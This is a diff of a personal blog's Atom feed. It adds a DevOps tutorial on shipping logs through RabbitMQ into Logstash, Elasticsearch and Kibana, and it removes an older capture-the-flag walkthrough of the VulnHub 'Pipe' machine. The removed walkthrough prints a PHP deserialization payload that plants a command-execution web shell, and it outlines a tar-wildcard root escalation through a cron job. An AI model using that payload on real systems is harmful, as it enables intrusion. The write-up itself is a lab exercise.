@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://yoursite.com/"/>
-  <updated>2018-12-26T19:43:14.139Z</updated>
+  <updated>2019-01-12T18:51:03.983Z</updated>
   <id>http://yoursite.com/</id>
   
   <author>
@@ -15,6 +15,40 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>Setting Up RabbitMQ ElasticSearch Kibana LogStash</title>
+    <link href="http://yoursite.com/2019/01/12/Setting%20Up%20RabbitMQ%20ElasticSearch%20Kibana%20LogStash%20/"/>
+    <id>http://yoursite.com/2019/01/12/Setting Up RabbitMQ ElasticSearch Kibana LogStash /</id>
+    <published>2019-01-12T15:03:58.693Z</published>
+    <updated>2019-01-12T18:51:03.983Z</updated>
+    
+    <content type="html"><![CDATA[<p><img src="/images/Untitled Diagram.png" alt=""></p><p><strong>End Goal here is to ship logs with Logstash, Elasticsearch and RabbitMQ</strong></p><iframe src="https://carbon.now.sh/embed/?bg=rgba(255%2C255%2C255%2C1)&t=dracula&wt=none&l=application%2Fjson&ds=false&dsyoff=20px&dsblur=68px&wc=true&wa=true&pv=48px&ph=32px&ln=false&fm=Hack&fs=13px&lh=133%25&si=false&code=input%2520%257B%250A%2520%2520rabbitmq%2520%257B%250A%2520%2520%2520%2520host%2520%253D%253E%2520%2522rabbit%2522%250A%2520%2520%2520%2520queue%2520%253D%253E%2520%2522LogginQueue%2522%250A%2520%2520%2520%2520port%2520%253D%253E%25205672%250A%2520%2520%2520%2520durable%2520%253D%253E%2520true%250A%2520%2520%2520%2520password%2520%253D%253E%2520%2522guest%2522%250A%2520%2520%2520%2520user%2520%253D%253E%2520%2522guest%2522%250A%2520%2520%257D%250A%257D%250Aoutput%2520%257B%250A%2520%2520elasticsearch%2520%257B%250A%2520%2520%2520%2520hosts%2520%253D%253E%2520%255B%2522elasticsearch%2522%255D%250A%2520%2520%257D%250A%257D&es=4x&wm=false" style="transform:scale(0.7); width:1024px; height:473px; border:0; overflow:hidden;" sandbox="allow-scripts allow-same-origin"><br></iframe><p>We will use this config file for our logstash pipe with the rabbitmq plugin, note the loggingqueue we will create later on..</p><p>We’ll save this config file as logstash.conf in the same directory that we will save the docker-compose.yml that I created.</p><iframe src="https://carbon.now.sh/embed/?bg=rgba(255%2C255%2C255%2C1)&t=dracula&wt=none&l=yaml&ds=false&dsyoff=20px&dsblur=68px&wc=true&wa=true&pv=48px&ph=32px&ln=false&fm=Hack&fs=13px&lh=133%25&si=false&code=version%253A%2520%25223%2522%250Aservices%253A%250A%2520%2520%2520%2520logstash%253A%250A%2520%2520%2520%2520%2520%2520%2520%2520container_name%253A%2520logstash%250A%2520%2520%2520%2520%2520%2520%2520%2520links%253A%250A%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520-%2520'elasticsearch%253Aelasticsearch'%250A%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520-%2520'rabbitmq%253Arabbit'%250A%2520%2520%2520%2520%2520%2520%2520%2520volumes%253A%250A%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520-%2520'.%252Flogstash.conf%253A%252Fusr%252Fshare%252Flogstash%252Fpipeline%252Flogstash.conf'%250A%2520%2520%2520%2520%2520%2520%2520%2520image%253A%2520'logstash%253A6.5.0'%250A%2520%2520%2520%2520elasticsearch%253A%250A%2520%2520%2520%2520%2520%2520%2520%2520container_name%253A%2520es%250A%2520%2520%2520%2520%2520%2520%2520%2520ports%253A%250A%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520-%2520'9200%253A9200'%250A%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520-%2520'9300%253A9300'%250A%2520%2520%2520%2520%2520%2520%2520%2520image%253A%2520'docker.elastic.co%252Felasticsearch%252Felasticsearch%253A6.5.0'%250A%2520%2520%2520%2520rabbitmq%253A%250A%2520%2520%2520%2520%2520%2520%2520%2520container_name%253A%2520rabbit%250A%2520%2520%2520%2520%2520%2520%2520%2520ports%253A%250A%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520-%2520'30000%253A5672'%250A%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520-%2520'30001%253A15672'%250A%2520%2520%2520%2520%2520%2520%2520%2520image%253A%2520'rabbitmq%253Amanagement'%250A%2520%2520%2520%2520kibana%253A%250A%2520%2520%2520%2520%2520%2520%2520%2520container_name%253A%2520kibana%250A%2520%2520%2520%2520%2520%2520%2520%2520links%253A%250A%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520-%2520'elasticsearch%253Aelasticsearch'%250A%2520%2520%2520%2520%2520%2520%2520%2520ports%253A%250A%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520-%2520'5601%253A5601'%250A%2520%2520%2520%2520%2520%2520%2520%2520image%253A%2520'kibana%253A6.5.0'&es=4x&wm=false" style="transform:scale(0.7); width:1024px; height:673px; border:0; overflow:hidden;" sandbox="allow-scripts allow-same-origin"><br></iframe><p>Awesome, lets create our queue, exchange and bindings on rabbit.</p><p><a href="http://localhost:30001/#/queues" target="_blank" rel="noopener">http://localhost:30001/#/queues</a></p><p>username:guest<br>password:guest</p><p>click on queue ==&gt; add a new queue</p><p><img src="/images/rabbitmque.png" alt=""></p><p>click on exchange ==&gt; add a new exchange</p><p><img src="/images/rabbitxchange.png" alt=""></p><p>back to queue ==&gt; click on bindings</p><p><img src="/images/rabbitbinding.png" alt=""></p><p>Awesome,</p><p><strong>Now Let’s send some raw data with the rabbit’s http api to intialzie the elasticsearch logstash index. and to check that everything is working.</strong></p><p>We’ll use Curl XPOST</p><iframe src="https://carbon.now.sh/embed/?bg=rgba(255%2C255%2C255%2C1)&t=dracula&wt=none&l=application%2Fx-sh&ds=false&dsyoff=20px&dsblur=68px&wc=true&wa=true&pv=48px&ph=32px&ln=false&fm=Hack&fs=13px&lh=133%25&si=false&code=curl%2520-i%2520-u%2520guest%253Aguest%2520-XPOST%2520-H%2520%2522Content-Type%253A%2520application%252Fjson%2522%2520http%253A%252F%252Flocalhost%253A30001%252Fapi%252Fexchanges%252F%25252F%252Floggerexchange%252Fpublish%2520-d%2520'%250A%257B%250A%2520%2520%2522vhost%2522%253A%2520%2522%252F%2522%252C%250A%2520%2520%2522name%2522%253A%2520%2522logger%2522%252C%250A%2520%2520%2522properties%2522%253A%2520%257B%250A%2520%2520%2520%2520%2522delivery_mode%2522%253A%25202%252C%250A%2520%2520%2520%2520%2522headers%2522%253A%2520%257B%257D%250A%2520%2520%257D%252C%250A%2520%2520%2522routing_key%2522%253A%2520%2522myApp%2522%252C%250A%2520%2520%2522delivery_mode%2522%253A%2520%25222%2522%252C%250A%2520%2520%2522payload%2522%253A%2520%2522Event%253DHello%2520LogStash%2522%252C%250A%2520%2520%2522headers%2522%253A%2520%257B%257D%252C%250A%2520%2520%2522props%2522%253A%2520%257B%257D%252C%250A%2520%2520%2522payload_encoding%2522%253A%2520%2522string%2522%250A%257D'&es=4x&wm=false" style="transform:scale(0.7); width:1024px; height:473px; border:0; overflow:hidden;" sandbox="allow-scripts allow-same-origin"><br></iframe><p>Let’s open the kibanna and create index pattern for logstash</p><p><img src="/images/createindex.png" alt=""></p><p>Just to make sure I’ll create a loop of messages</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">for i in &#123;1..100&#125;; do </span><br><span class="line">curl -i -u guest:guest -XPOST -H &quot;Content-Type: application/json&quot; http://localhost:30001/api/exchanges/%2F/loggerexchange/publish -d &apos;</span><br><span class="line">&#123;</span><br><span class="line">  &quot;vhost&quot;: &quot;/&quot;,</span><br><span class="line">  &quot;name&quot;: &quot;logger&quot;,</span><br><span class="line">  &quot;properties&quot;: &#123;</span><br><span class="line">    &quot;delivery_mode&quot;: 2,</span><br><span class="line">    &quot;headers&quot;: &#123;&#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  &quot;routing_key&quot;: &quot;myApp&quot;,</span><br><span class="line">  &quot;delivery_mode&quot;: &quot;2&quot;,</span><br><span class="line">  &quot;payload&quot;: &quot;Event=Hello LogStash&apos;$i&apos;&quot;,</span><br><span class="line">  &quot;headers&quot;: &#123;&#125;,</span><br><span class="line">  &quot;props&quot;: &#123;&#125;,</span><br><span class="line">  &quot;payload_encoding&quot;: &quot;string&quot;</span><br><span class="line">&#125;&apos;;</span><br><span class="line">done</span><br></pre></td></tr></table></figure><p>And that took about half a second to send 100 message logs</p><p><img src="/images/100messages.png" alt=""></p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;p&gt;&lt;img src=&quot;/images/Untitled Diagram.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;End Goal here is to ship logs with Logstash, Elasticsearch and RabbitMQ&lt;/s
+      
+    
+    </summary>
+    
+      <category term="Devops" scheme="http://yoursite.com/categories/Devops/"/>
+    
+      <category term="Logging" scheme="http://yoursite.com/categories/Devops/Logging/"/>
+    
+    
+      <category term="ElasticSearch" scheme="http://yoursite.com/tags/ElasticSearch/"/>
+    
+      <category term="Kibana" scheme="http://yoursite.com/tags/Kibana/"/>
+    
+      <category term="LogStash" scheme="http://yoursite.com/tags/LogStash/"/>
+    
+      <category term="RabbitMQ" scheme="http://yoursite.com/tags/RabbitMQ/"/>
+    
+  </entry>
   
   <entry>
     <title>How I Drank This Website Data</title>
@@ -566,33 +600,6 @@
       <category term="Scripts" scheme="http://yoursite.com/tags/Scripts/"/>
     
       <category term="Mail" scheme="http://yoursite.com/tags/Mail/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>Pipe-WalkThrough</title>
-    <link href="http://yoursite.com/2018/08/15/Pipe-WalkThrough/"/>
-    <id>http://yoursite.com/2018/08/15/Pipe-WalkThrough/</id>
-    <published>2018-08-15T20:44:52.000Z</published>
-    <updated>2019-01-06T18:48:31.259Z</updated>
-    
-    <content type="html"><![CDATA[<p>Pipe Walkthrough</p><p>Machine can be downloaded from here:</p><p><a href="https://www.vulnhub.com/entry/devrandom-pipe,124/" target="_blank" rel="noopener">https://www.vulnhub.com/entry/devrandom-pipe,124/</a></p><p>Initiate Port+Service Scan:</p><p><img src="/images/w.png" alt=""></p><p>Http-Auth Barrier seems interestingnfo&amp;quoive ths:</p><p>O:4:&quot;Info&quot;:4:{s:2:&quot;id&quot;;i:1; in retrieving the page + I got a parameter cookie</p><p><img src="/images/x.png" alt=""></p><p>Url Decode give this:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:4:&quot;Info&quot;:4:&#123;s:2:&quot;id&quot;;i:1;s:9:&quot;firstname&quot;;s:4:&quot;Rene&quot;;s:7:&quot;surname&quot;;s:8:&quot;Margitte&quot;;s:7:&quot;artwork&quot;;s:23:&quot;The Treachery of Images&quot;;&#125;</span><br></pre></td></tr></table></figure><p>Dir-busting content</p><p><img src="/images/y.png" alt=""></p><p>The php.js shows us serialize function → Related to our previous findings.</p><p><img src="/images/z.png" alt=""></p><p>and the log.php.BAK seems to work with that function.</p><p>After Understanding the mechanism of the serialize of characters counting</p><p>We will inject this url encoded<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:3:&quot;Log&quot;:2:&#123;s:8:&quot;filename&quot;;s:29:&quot;/var/www/html/scriptz/cmd.php&quot;;s:4:&quot;data&quot;;s:41:&quot;\&lt;?php $cmd=$_GET[&apos;cmd&apos;]; system($cmd); ?\&gt;&quot;;&#125;</span><br></pre></td></tr></table></figure></p><p>That leads us to half-shell on the machine that we will upgrade to full-shell:</p><p><img src="/images/ab.png" alt=""></p><p>On the machine we dig a little and we find intersting cron-job</p><table><thead><tr><th>www-data@pipe:/usr/bin$ cat compress.shcat compress.sh#!/bin/sh rm -f /home/rene/backup/backup.tar.gzcd /home/rene/backuptar cfz /home/rene/backup/backup.tar.gz *chown rene:rene /home/rene/backup/backup.tar.gzrm -f /home/rene/backup/*.BAK</th></tr></thead><tbody><tr><td></td></tr></tbody></table><p>Script create back-ups by taring the files,</p><p>We can manipulate the tar to code execution as root to because the script contains * <a href="https://www.exploit-db.com/papers/33930/" target="_blank" rel="noopener">https://www.exploit-db.com/papers/33930/</a></p><p>flag: 0089cd4f9ae79402cdd4e7b8931892b7</p>]]></content>
-    
-    <summary type="html">
-    
-      
-      
-        &lt;p&gt;Pipe Walkthrough&lt;/p&gt;
-&lt;p&gt;Machine can be downloaded from here:&lt;/p&gt;
-&lt;p&gt;&lt;a href=&quot;https://www.vulnhub.com/entry/devrandom-pipe,124/&quot; target=&quot;_
-      
-    
-    </summary>
-    
-      <category term="Pentest" scheme="http://yoursite.com/categories/Pentest/"/>
-    
-    
-      <category term="Pentesting" scheme="http://yoursite.com/tags/Pentesting/"/>
     
   </entry>
   
